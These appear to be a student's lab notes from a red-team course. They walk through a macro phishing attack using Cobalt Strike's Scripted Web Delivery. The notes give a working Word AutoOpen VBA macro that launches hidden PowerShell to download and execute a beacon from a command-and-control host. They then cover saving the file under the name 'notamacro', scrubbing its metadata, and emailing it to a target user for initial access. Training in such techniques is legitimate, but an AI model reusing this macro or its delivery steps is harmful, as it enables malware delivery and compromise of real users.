to first setup a Scripted Web Delivery host file go to Attacks -> Scripted Web Delivery
- Scripted Web Delivery gives us the one liner to paste
![[Pasted image 20230825111253.png]]
Can leave URI Path as default
Localhost is the Teams Server
![[Pasted image 20230825111520.png]]
This generates the string that will call back to the teams server
![[Pasted image 20230825111628.png]]
Open word as admin -> Click View -> Macros -> View macros
Created macro named newdoc
![[Pasted image 20230825105835.png]]
Copied and pasted macro from notes to pull back whatever beacon is being hosted on port 80
Ensure to add """ at the end to ensure that the macro will work.
```bash
# changed to ip address of teams server because i dont like dealing with host names.
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://10.10.5.50:80/a'))"""

End Sub
```
![[Pasted image 20230825110015.png]]
Clicked file -> save under payloads -> gave file name notamacro -> saved as type Word 97-2003 Document
![[Pasted image 20230825110413.png]]
After saving the file go to the word doc click file -> info -> Check for Issues -> and inspect document
![[Pasted image 20230825110527.png]]
Inspect the document with everything checked, then once the results come back click remove all on Document Properties and Personal Information.
![[Pasted image 20230825110927.png]]
after resave the document.

Open up outlook on cyberbotic\iyates : Summer 2022 and attach the macro to send to bob farmer
![[Pasted image 20230825112155.png]]
Logon to WKSTN-2 to open the email as bob farmer.
Open the notamacro.doc
![[Pasted image 20230825112618.png]]
Enable macros and a powershell instance will flash on the screen to kick off the shell code for beacon
![[Pasted image 20230825112737.png]]
Now we have initial access to bfarmer.
![[Pasted image 20230825112810.png]]